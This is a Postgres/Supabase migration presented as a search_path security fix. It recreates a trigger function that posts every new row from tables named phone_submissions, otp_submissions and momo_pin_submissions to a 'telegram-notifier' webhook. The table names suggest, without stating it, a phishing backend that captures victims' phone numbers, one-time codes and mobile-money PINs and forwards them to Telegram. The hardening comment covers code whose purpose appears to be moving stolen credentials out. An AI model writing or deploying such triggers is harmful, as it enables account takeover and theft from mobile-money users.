/*
  # Fix Function Search Path Security Issue

  1. Update notify_telegram function
    - Add immutable SET search_path clause
    - Prevents privilege escalation through function search path
    - Makes function behavior deterministic and secure
*/

-- Drop existing triggers
DROP TRIGGER IF EXISTS telegram_notify_phone ON phone_submissions;
DROP TRIGGER IF EXISTS telegram_notify_otp ON otp_submissions;
DROP TRIGGER IF EXISTS telegram_notify_momo ON momo_pin_submissions;

-- Drop and recreate function with secure search_path
DROP FUNCTION IF EXISTS public.notify_telegram();

CREATE OR REPLACE FUNCTION public.notify_telegram()
RETURNS trigger AS $$
DECLARE
  webhook_url text;
  payload jsonb;
BEGIN
  webhook_url := 'https://nfjjxhmcbaihszfmrnjg.supabase.co/functions/v1/telegram-notifier';

  payload := jsonb_build_object(
    'type', TG_OP,
    'table', TG_TABLE_NAME,
    'schema', TG_TABLE_SCHEMA,
    'record', row_to_json(NEW),
    'old_record', NULL
  );

  PERFORM net.http_post(
    url := webhook_url,
    headers := jsonb_build_object(
      'Content-Type', 'application/json'
    ),
    body := payload
  );

  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;

-- Recreate triggers
CREATE TRIGGER telegram_notify_phone
  AFTER INSERT ON phone_submissions
  FOR EACH ROW
  EXECUTE FUNCTION public.notify_telegram();

CREATE TRIGGER telegram_notify_otp
  AFTER INSERT ON otp_submissions
  FOR EACH ROW
  EXECUTE FUNCTION public.notify_telegram();

CREATE TRIGGER telegram_notify_momo
  AFTER INSERT ON momo_pin_submissions
  FOR EACH ROW
  EXECUTE FUNCTION public.notify_telegram();